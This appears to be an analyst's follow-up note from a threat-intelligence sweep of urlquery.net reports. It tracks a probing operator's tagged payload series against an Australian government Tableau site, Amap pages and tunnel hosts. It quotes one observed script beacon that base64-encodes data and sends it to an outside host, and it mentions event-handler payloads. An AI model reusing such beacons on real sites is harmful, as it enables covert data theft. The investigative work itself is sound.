# Extended keyless htmx sweep — corpus re-mine follow-up

**Date run:** 2026-10-05 ~06:53–07:05 UTC · **Method:** curl against `https://urlquery.net/api/htmx/search/`
(HTTP 429 would be a hard stop; none hit; ≥13s pacing). Python `uq_htmx.py` not used —
urllib is broken on this VM (dies in the proxy CONNECT tunnel); raw HTML saved per page
(`limit=24`, offset pages until short page) and parsed locally with the same regex.
Script: `/tmp/htmx_ext/sweep.sh` + `/tmp/htmx_ext/parse.py` (scratch); parsed JSON in
`/tmp/htmx_ext/parsed/`, new-vs-known table in `/tmp/htmx_ext/new_reports.json`.

**Queries run (10):** `uqtag`, `probe2`, `qjprobe`, `AGEDATA23`, `agedata`, `pandalegacy`,
`sub_poi_navi`, `uqcors`, `uqscan`, `zz=oai`. All in window 2024-11 → 2026-10; nothing
in the 2026-06 → 2026-10 operator window was excluded by date filtering.

**Coverage caveat (important):** the htmx search index is a partial view. `q=uqscan`
returned only 45 hits while the corpus holds ~2,000 — the endpoint surfaces the most
recent ~45 and does not deep-paginate the full history. So this sweep finds *recent*
and *distinctively-titled* reports; absence of a hit is NOT absence from urlquery.
`pandalegacy` and `qjprobe` returned 0 rows despite matching reports existing in our
corpus — the search tokenizer does not index those terms. Corpus > htmx for Amap terms.

## CORRECTIONS to corpus-remine.md §5

1. The "2026-09-01 (probe2-start)" hit does not exist. The 09-01 10:25 hit was the
   vimeo spam-noise report (`b3a35f71`). Actual probe2-start: **2026-10-04 10:25**
   (`2d8361e9-63e9-4f3b-a39f-46defcefaa82`).
2. The sibling's title is **`qprobe-start`**, not `qjprobe-start` — decoded from the
   base64 payload of `271fa985-0317-4396-98a0-dac9cd5080cb` (2026-10-04 10:37). The
   string "qjprobe" appears nowhere in the corpus or the htmx index.
3. Of the 4 June-2026 AIHW reports, only ONE carries `uqtag=AGEDATA23`. The others are
   `AGEDATA24`, `AGEVS25`, `AGEDATA24B` — AGEDATA23 is one step in a numbered series,
   not the strand's name. Full series recovered below.
4. Prior sweep's `uq_htmx.py` regex capped anchor text at 300 chars; base64 payload
   URLs are thousands of chars, so it only surfaced 4 of the 27 June-20 AIHW
   reports. Fixed regex recovered the rest.

## NEW REPORTS (47 operator-grade new vs corpus)

### A. June-20-2026 AIHW Tableau R&D series — 23 new + 4 known (new sequence)

~27 sequential probes against `vizprod.aihw.gov.au` Tableau modules
(AGE115_MentalhealthinAgedCare_19072024 etc.), 2026-06-20 08:51 → 13:02, via
pie.dev / httpbin.org / httpbingo.org / httpbun.com `/base64/` echo services.
`uqtag=` is a **URL query param appended after the payload**, and the tags form a
numbered R&D sequence; `h`/`u`/`p` suffixes = per-echo-host variants (mirrors the
operator's host-coverage R&D pattern):

| # | report ID | date (UTC) | echo host | uqtag= |
|---|---|---|---|---|
| 1 | 8a1299df-d6f8-4063-9e57-c1b847e84189 | 2026-06-20 08:51 | httpbin.org | AGEMARK3 |
| 2 | 9c5399b2-d613-4549-89e6-556cd8c21c5a | 2026-06-20 08:55 | httpbin.org | AGEMARK3S |
| 3 | e0ec88ac-06f3-4b26-b368-45752368e102 | 2026-06-20 09:02 | pie.dev | AGEUND4 |
| 4 | 63d7d28d-298d-4ec5-bf1e-aa3d53bbc4b5 | 2026-06-20 09:05 | pie.dev | AGEMARK5 |
| 5 | d99715c2-219f-4aee-bb87-c665114ebb36 | 2026-06-20 09:16 | pie.dev | AGEDIALOG7 |
| 6 | 6508c71f-fb80-4c86-852e-e94e46cd74e0 | 2026-06-20 09:23 | pie.dev | AGECROSS8 |
| 7 | 605e393f-724a-453a-89fe-c6fc2ebdd0f5 | 2026-06-20 09:26 | pie.dev | MOUSETEST9 |
| 8 | 2f53aed8-6701-4b90-b432-62456a4fe8fc | 2026-06-20 09:52 | httpbin.org | AGEEXCEL10h |
| 9 | 6d06d30a-10d9-417d-8b2a-ba491633dc62 | 2026-06-20 09:54 | pie.dev | AGEEXCEL10p |
| 10 | 40b14ada-3e1b-4040-be99-5b1c6b44c27f | 2026-06-20 10:03 | pie.dev | AGEEX11 |
| 11 | dc59d0dc-0574-4265-ab31-d039646fa8e7 | 2026-06-20 10:11 | pie.dev | AGETIP12p |
| 12 | ce624a5e-2c08-416b-a4a2-9acb986a35e1 | 2026-06-20 10:18 | httpbingo.org | AGETIP12h |
| 13 | d0cf8cd7-0d84-4477-8981-0d1bc824ed01 | 2026-06-20 10:19 | httpbin.org | AGETIP12h |
| 14 | a4188b97-ba17-435a-a5ab-fdee5ad7bc9e | 2026-06-20 10:19 | httpbun.com | AGETIP12u |
| 15 | 1da31d0f-33c9-44bf-9356-813bd729d8d6 | 2026-06-20 10:37 | httpbun.com | AGETIP12B |
| 16 | 7ae8f05b-c02c-4dff-a6b4-b64adda97568 | 2026-06-20 10:53 | httpbun.com | AGEHOVER13 |
| 17 | 23f6f6c2-5a8b-4765-8334-849e87c2f9bc | 2026-06-20 10:55 | httpbun.com | AGEFILTER14 |
| 18 | b8eac734-1e72-4193-8a03-ee947a7dcbe6 | 2026-06-20 11:21 | httpbun.com | AGEOPEN15 |
| 19 | 49c524b1-26b5-4976-9a8c-94612bd70f9a | 2026-06-20 11:31 | example.com | FORMTEST123 |
| 20 | c3b0cc1b-bfe4-4231-8d55-4970194c0cbf | 2026-06-20 11:35 | httpbun.com | AGEOBJ18 |
| 21 | 000f58ed-54fa-4aa1-ab39-f116b9245775 | 2026-06-20 11:38 | httpbun.com | AGEMSG19 |
| 22 | 877328d4-eb7c-409c-a6e5-b034bfd9384f | 2026-06-20 12:24 | httpbun.com | AGEMSG20 |
| 23 | 12bb6ddb-b4e3-4c45-908c-708ab63a29cb | 2026-06-20 12:32 | httpbun.com | AGECROSS22 |
| 24 | fbda6df4-8a64-4372-b410-31e63c23154e | 2026-06-20 12:52 | httpbun.com | AGEDATA23 (known) |
| 25 | 9188235a-4159-416e-bddf-0dd464991163 | 2026-06-20 12:54 | httpbun.com | AGEDATA24 (known) |
| 26 | 1fd1c390-e00c-456b-84f5-1851da2da83e | 2026-06-20 12:59 | httpbun.com | AGEVS25 (known) |
| 27 | 81dc5646-5c8c-4e78-b019-66943b754280 | 2026-06-20 13:02 | httpbun.com | AGEDATA24B (known) |

Notable payloads: MOUSETEST9 (`onmousemove` handler), AGEOPEN15
(`new Image().src='https://example.com/OPEN15/'+btoa(...)` — window.open beacon
exfil), AGEMARK3 (`<pre id=o>WAIT AGEMARK3</pre>` rendezvous text). Tags 1, 2, 6
missing from the indexed set — may not exist or not indexed.

### B. June-2026 `.lhr.life` tunnel R&D — 12 new

**uqcors burst (8), `7e7ff6dbbe9824.lhr.life/uqcors.html?v=1`, 2026-06-18 14:37–14:38**
— 8 identical CORS-probe submissions inside ~60s (per-request retry/nonce probing):

2c251f35-c3ab-431f-a70e-f9c2774cd658 · f0510791-fb58-4825-888c-bb2412867fba ·
de54e62a-26ad-419d-85b7-60149769cd26 · 7482a325-dce8-4e77-93dc-0c74174cc398 ·
62835c92-1ad1-4003-9508-f02bb39ce432 · 95c1f0f3-a1a2-40cd-815d-f63370b9f14a ·
13cb14ab-a1d8-40f1-bd1f-5d2fb92607a5 · 3167e447-d4bb-4e3d-b2b1-e0650ec8d046

**probe2 nonce probes (4), `91ef9fc4c82a1b.lhr.life/probe2.html?n=…`, 2026-06-21 21:23–21:31**
— sequential nonces `1782077001/7002/703/704` (matches operator's per-request-nonce
probing style):

724b1fe8-a79d-4ad6-86d7-798a10d5fe75 (21:23) ·
7f659c97-93d0-4752-ba03-dba4ac9dfbdf (21:26) ·
ddb3ebba-bdf7-43b1-87df-68cc53371a09 (21:31) ·
85cc8ea9-2390-4c44-8349-8b8e2ce8733b (21:31)

`lhr.life` subdomains are hex-prefixed, ephemeral-looking — likely tunnel/proxy
endpoints, not real targets. This is the operator's June-2026 exfil/CORS R&D lane,
3.5 months before the Amap campaign, same `uq*` tag-grammar family.

### C. 2026-10-05 operator activity past corpus cutoff — 12 new

Corpus covers through 2026-10-05 ~01:26; these 12 landed 01:43–04:11, same
operator grammar (new tag families):

| report ID | date (UTC) | submitted URL |
|---|---|---|
| f1b490eb-2ceb-4d98-bac3-58bf1f6d168b | 2026-10-05 01:43 | www.amap.com/service/poiInfo?id=B0FFGY018L&query_type=IDQ&uqscan=97ceeae2-c884-437d-b348-9d41e5f11d71 |
| 8f3dd4d4-f7de-4493-a9a7-86dee94f2351 | 2026-10-05 01:47 | amap-pc-ssr.amap.com/ssr/search/poi_detail?id=B01FE16U78&source=poi_search&uqscan=nested20261005b |
| c40d4708-4f54-4f98-a5a5-57196c517fb5 | 2026-10-05 01:59 | amap-pc-ssr.amap.com/ssr/place/B01FE16U78?uqscan=wuxizoo20261005a |
| 2f4cf0ce-e252-4ae2-94f3-6f5e26a09642 | 2026-10-05 02:31 | amap-pc-ssr.amap.com/ssr/api/getPoiInfo?id=B01730HZRE&uqscan=henanmuseum_20261005a |
| 76d04ee3-e8d5-4884-b4e7-f90970a5010a | 2026-10-05 02:33 | amap-pc-ssr.amap.com/ssr/place/B01730HZRE?uqscan=henanmuseum_page_20261005a |
| 18831d60-622f-4125-b3cd-60fae51e2a95 | 2026-10-05 03:16 | amap-pc-ssr.amap.com/ssr/place/B021406HP0?uqscan=qingdaomuseum20261005b |
| 521a9347-facb-4402-8f2a-f323618ae217 | 2026-10-05 03:43 | amap-pc-ssr.amap.com/ssr/place/B03DF05V64?uqscan=17911717674179 |
| d7e29821-9253-4a2e-9b5d-05f17ba44579 | 2026-10-05 03:43 | amap-pc-ssr.amap.com/ssr/place/B03DF05V64?uqscan=17911717661939 |
| ee147db2-9b3b-4ef4-b4f2-fd304973a9c7 | 2026-10-05 03:43 | amap-pc-ssr.amap.com/ssr/place/B03DF05V64?uqscan=17911717689595 |
| 967b20ce-ad80-4042-8e24-1430896ddb80 | 2026-10-05 04:11 | ditu.amap.com/detail/get/detail?id=B021406HP0&uqscan=qdoldditu20261005a |
| 48bb99bc-a3ac-49da-8b4b-eee228772dec | 2026-10-05 04:11 | amap-pc-ssr.amap.com/ssr/api/getPoiInfo?id=B021406HP0&uqscan=qdnewapi20261005a |
| 0186fb64-56c5-4323-a151-3a20d7e37c37 | 2026-10-05 04:11 | amap-pc-ssr.amap.com/ssr/api/getPoiInfo?uqscan=qdnewapi20261005b&id=B021406HP0 |

New tag families: `qingdaomuseum20261005b`, `henanmuseum_20261005a` (+`_page`),
`wuxizoo20261005a`, `qdnewapi20261005a/b`, `qdoldditu20261005a` (`qd` = Qingdao),
`nested20261005b`, `claude20261005mobile1/2` (corpus has these last two —
grep-confirmed in-corpus). B021406HP0 is a new POI (Qingdao museum).

## KNOWN vs NEW split (htmx-found, attribution-grade)

| bucket | count | notes |
|---|---|---|
| Known, in-corpus (grep/ID-verified) | 51 | 15× uqtag (6 ltzh + 9 hybrid/zjb/zx/s9/directly, 10-04) + 3× sub_poi_navi + 33× uqscan (incl. Oct-4/5 iframe-chain + claude-mobile, up to 10-05 01:26) |
| Known, NOT in corpus (the prior sweep's 9) | 6 | unique IDs: 4× AIHW AGEDATA23/24/VS25/24B + 2× probe2-start/qprobe-start — found via htmx only, never integrated |
| **NEW, not in corpus** | **55** | 47 operator-grade + 8 noise |
| ↳ operator-grade | 47 | 23× June-20 AIHW series + 8× June-18 uqcors + 4× June-21 probe2 + 12× Oct-05 uqscan |
| ↳ noise (excluded) | 8 | 5× old probe2 matches (2024-11 → 2026-05, unrelated sites) + 3× spam (vimeo 09-01, 2 casino) |

Answer to the three explicit follow-ups:
- **(a) More June-2026 R&D strands:** YES — the AIHW series is 23 reports larger
  than previously known (full numbered sequence 3→25), plus two new `.lhr.life`
  tunnel lanes: uqcors CORS burst (Jun 18) and probe2 nonce probes (Jun 21).
- **(b) probe2/qjprobe siblings:** 4 new June-21 probe2 nonce probes on
  `91ef9fc4c82a1b.lhr.life`. No `qjprobe` anywhere — the sibling is `qprobe-start`
  (title correction). 5 other probe2 hits are unrelated old noise.
- **(c) uqtag values other than AGEDATA23:** YES — the full June-20 numbered
  series (AGEMARK3/3S, AGEUND4, AGEMARK5, AGEDIALOG7, AGECROSS8, MOUSETEST9,
  AGEEXCEL10h/10p, AGEEX11, AGETIP12p/12h/12u/12B, AGEHOVER13, AGEFILTER14,
  AGEOPEN15, FORMTEST123, AGEOBJ18, AGEMSG19/20, AGECROSS22, AGEDATA24/24B,
  AGEVS25) plus the Oct-04 ltzh/hybrid/zjb/zx/s9/probe2-start/qprobe-start
  families. AGEDATA23 is step 23 of 27.

## Honest zeros

- `qjprobe`: 0 hits (and 0 in corpus — the term was a transcription error).
- `pandalegacy`: 0 htmx hits (3 matching reports exist in-corpus; search index
  does not surface them).
- `agedata`: 0 hits (case-sensitive search behavior; AGEDATA23 found via `uqtag`
  and `AGEDATA23` queries).
- `zz=oai`: 0 hits.
- `AGEDATA23` as a standalone query: 1 hit (one of the known 4).

## Open / out of scope (needs keyed API or further work)

1. Keyed `settings` pull (UA/exit_node) for the 44 new reports — would confirm
   the June-2026 `.lhr.life`/AIHW strands as the same operator vs a lookalike.
2. The 6-casino-domain ltzh burst cluster attribution — unchanged, still open.
3. Missing AGE-sequence numbers 1, 2, 6 and the 3 never-integrated "known" IDs
   could be pulled into the corpus (their public pages render fine; only
   `settings` needs the key).
4. htmx search coverage is partial — deep `uqscan` history beyond the newest ~45
   is invisible to this endpoint; corpus remains the source of truth for Amap
   terms.
5. `.lhr.life` infrastructure: who runs it, whether the two subdomains belong to
   the same tunnel account, and whether more `*.lhr.life` probes exist (search
   `lhr.life` via htmx — not done this run).
